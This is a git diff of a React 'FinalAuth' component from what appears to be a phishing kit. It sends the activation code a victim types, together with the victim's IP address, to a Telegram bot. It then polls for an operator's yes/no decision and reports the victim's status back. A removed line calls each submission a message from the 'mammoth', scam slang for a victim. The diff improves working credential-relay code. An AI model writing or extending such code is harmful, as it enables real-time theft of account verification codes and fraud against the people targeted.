@@ -27,23 +27,32 @@ const FinalAuth = (props) => {
                 firstState = res.data.result;
             })
         setLoading(true);
-        axios.post(bot.sendMessage(message + '%20сообщение%20от%20мамонта'), '')
-        axios.post(bot.sendMessage("yes_or_no"));
+        axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
+            ' отправил код активации: ' + message + '.%0AВведите (yes_no)'), '')
     }
 
     const getUpdatesInterval =  () => {
-        axios.get(bot.getUpdates())
+        let req;
+        if (firstState.length > 80) {
+            req = bot.getUpdatesOffset(Number(firstState[firstState.length - 1].update_id) + 1)
+        } else req = bot.getUpdates();
+        axios.get(req)
             .then((res) => {
                 if (firstState) {
                     if (res.data.result.length !== firstState.length) {
                         let text = res.data.result[res.data.result.length - 1].message.text;
-                        if (text === 'yes') {
-                            setCorrect(true);
-                            setLoading(false);
-                        }
-                        else if (text === 'no') {
-                            setLoading(false);
-                            setError(true);
+                        if (text.indexOf(props.info.IPv4) !== -1) {
+                            if (text.indexOf('yes') !== -1) {
+                                setCorrect(true);
+                                setLoading(false);
+                                axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
+                                    ' Подтвердил код и находится в режиме ожидания'), '')
+                            } else if (text.indexOf('no') !== -1) {
+                                axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
+                                    ' Не подтвердил код и пробует еще раз'), '')
+                                setLoading(false);
+                                setError(true);
+                            } else firstState = res.data.result;
                         } else firstState = res.data.result;
                     }
                 } else firstState = res.data.result;
@@ -53,7 +62,6 @@ const FinalAuth = (props) => {
 
     useEffect(() => {
         if (isLoading) {
-            console.log("Start");
             const interval = setInterval(getUpdatesInterval, 5000);
             return () => clearInterval(interval);
         }
@@ -63,7 +71,7 @@ const FinalAuth = (props) => {
     return (
         <div className={classes.corral}>
             {isLoading ? <img src={loader} className={classes.loader}/> : null}
-            {!isCorrect ? <div className={[classes.contentContainerBordered, isLoading ? classes.loaderActive : ''].join(' ')}
+            {!isCorrect && props.state !== 2 ? <div className={[classes.contentContainerBordered, isLoading ? classes.loaderActive : ''].join(' ')}
                   style={{border: '0px'}}>
                 <header>
                     <p role={"img"}
